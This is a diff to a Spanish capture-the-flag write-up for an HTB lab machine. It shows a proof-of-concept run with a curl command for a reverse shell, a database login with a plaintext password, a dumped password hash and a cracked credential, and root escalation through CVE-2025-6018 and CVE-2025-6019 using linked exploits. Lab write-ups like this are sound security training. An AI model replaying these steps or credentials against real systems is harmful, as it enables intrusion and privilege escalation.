@@ -45,10 +45,8 @@ y ejecutamos el `poc.py` con  `python3 poc.py panel.pterodactyl.htb 'curl http:/
 Obteniendo asi una reverse shell
 
 Accedemos al mariadb que esta abierto que hemos visto con el CVE anterior
-
-mariadb -u pterodactyl -p'PteraPanel' -h 127.0.0.1
-
-select * from users
+`mariadb -u pterodactyl -p'PteraPanel' -h 127.0.0.1`
+`select * from users`
 
 ```ad-hint
 headmonitor::$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
@@ -63,6 +61,7 @@ phileasfogg3::!QAZ2wsx
 
 Vemos los archivos con permisos SUID y no encontramos nada, en la ruta /var/mail encontramos un mail que nos habla de un error en el servicio udisksd el cual tiene el  `CVE-2025-6019` pero pare explotar este antes necesitamos explotar CVE-2025-6018
 
-### CVE-2025-6018
-Haremos los pasos que se indican en la declaración de payload de `https://www.exploit-db.com/exploits/52386` creando un archivo en la ruta `~/.pam_environment` en la maquina victima
+### CVE-2025-6018 CVE-2025-6019
+Haremos los pasos que se indican en la declaración de payload de `https://www.exploit-db.com/exploits/52386` creando un archivo en la ruta `~/.pam_environment` en la maquina victima.
+EN nuestra maquina atacante generaremos la imagen con `https://github.com/guinea-offensive-security/CVE-2025-6019/blob/main/exploit.sh` esta imagen la pasamos a la maquina victima y ejecutamos el mismo exploit en ella, obteniendo así una shell como root
 
